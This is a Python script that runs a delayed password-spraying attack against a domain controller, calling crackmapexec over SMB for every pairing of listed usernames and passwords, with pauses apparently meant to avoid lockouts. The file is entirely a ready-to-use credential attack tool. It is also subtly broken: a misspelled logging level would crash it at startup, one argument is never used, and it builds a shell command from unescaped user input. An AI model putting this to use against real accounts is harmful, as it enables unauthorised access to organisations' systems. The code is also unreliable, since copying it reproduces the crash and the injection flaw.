import argparse, datetime, logging, os, re, subprocess, sys, time
from ipaddress import ip_address
from colorama import Fore, init

# DISCLAIMER: MADE WITH THE ASSISTANCE OF CHATGPT AND CURRENTLY UNDER TESTING!!! USE WITH CAUTION

# Initialize colorama
init(autoreset=True)

def is_valid_ipv4(address):
    try:
        ip_address(address)
        return True
    except ValueError:
        return False

def parse_and_validate_args():
    parser = argparse.ArgumentParser(description="This script sprays passwords with crackmapexec and an identified DC, with delays.")
    parser.add_argument("dc_ip_address", help="A valid IP address.")
    parser.add_argument("users_file", help="A local file containing newline-separated usernames.")
    parser.add_argument("passwords_file", help="A local file containing newline-separated passwords to spray.")
    parser.add_argument("output_file", help="File to log to.")
    parser.add_argument("delay_seconds", type=int, help="Integer number of seconds to wait after each command execution.")
    parser.add_argument("delay_between_passwords", type=int, help="Integer number of minutes to wait between spraying each password.")

    args = parser.parse_args()

    if not is_valid_ipv4(args.dc_ip_address):
        parser.error("[!]Invalid IP address")

    if not os.path.isfile(args.users_file) or not os.path.isfile(args.passwords_file):
        parser.error("[!]Users or Passwords list files do not exist")

    if args.delay_seconds < 0 or args.delay_between_passwords < 0:
        parser.error("[!]Delays must be non-negative")

    if os.stat(args.users_file).st_size == 0 or os.stat(args.passwords_file).st_size == 0:
        parser.error("[!]Users or Passwords list files cannot be empty")

    return args

def highlight_patterns(text):
    patterns = ['[*]', '[-]', '[!]', '[+]']
    for pattern in patterns:
        if pattern in text:
            text = text.replace(pattern, f"{Fore.LIGHTCYAN_EX}{pattern}{Fore.RESET}")
    return text

def main():
    args = parse_and_validate_args()

    dc_ip_address = args.dc_ip_address
    users_file = args.users_file
    passwords_file = args.passwords_file
    delay_seconds = args.delay_seconds
    delay_between_passwords = args.delay_between_passwords * 60

    timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    log_file = f"spray-log_{timestamp}.txt"
    logging.basicConfig(level=logging.DEUBG, format='%(asctime)s %(levelname)s %(message)s',
                        handlers=[logging.FileHandler(log_file), logging.StreamHandler()])

    try:
        with open(passwords_file) as passwords:
            check_passwords = passwords.readlines()
        if not check_passwords:
            logging.error(highlight_patterns("[!]Passwords file is empty"))
            return

        with open(users_file) as users:
            user_list = users.readlines()
        if not user_list:
            logging.error(highlight_patterns("[!]Users file is empty"))
            return

    except IOError as e:
        logging.error(highlight_patterns(f"[!]Failed to read file. Error: {str(e)}"))
        return

    logging.info(highlight_patterns(f"[-]Starting script with the following parameters:\n"
                 f"[-]DC IP Address: {dc_ip_address}\n"
                 f"[-]Users List: {users_file}\n"
                 f"[-]Passwords List: {passwords_file}\n"
                 f"[-]Delay seconds: {delay_seconds}\n"
                 f"[-]Delay between password values: {delay_between_passwords}\n"))

    total_passwords = len(check_passwords)
    total_users = len(user_list)

    for password_idx, password in enumerate(check_passwords, start=1):
        password_val = password.strip()
        logging.info(highlight_patterns(f"[*]Trying password {password_idx} of {total_passwords}"))

        for user_idx, user in enumerate(user_list, start=1):
            user_val = user.strip()
            logging.info(highlight_patterns(f"[*]Trying password {password_val} on user {user_idx} of {total_users}"))
            cmd = f"crackmapexec smb {dc_ip_address} -u {user_val} -p {password_val} --shares"

            try:
                process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()

                stdout = stdout.decode().strip() if stdout else ""
                stderr = stderr.decode().strip() if stderr else ""

                if stdout:  # if there is output, print it to the screen
                    logging.info(stdout)

                if process.returncode != 0:
                    logging.error(highlight_patterns(f"[!]Subprocess error: {stderr}"))

            except Exception as e:
                logging.error(highlight_patterns(f"[!]Subprocess error: {str(e)}"))
            time.sleep(delay_seconds)
        logging.info(highlight_patterns(f"[*] Sleeping for {delay_between_passwords/60} minutes, see you in a bit!"))
        time.sleep(delay_between_passwords)

    logging.info(highlight_patterns("[+]Script finished successfully"))

if __name__ == '__main__':
    main()
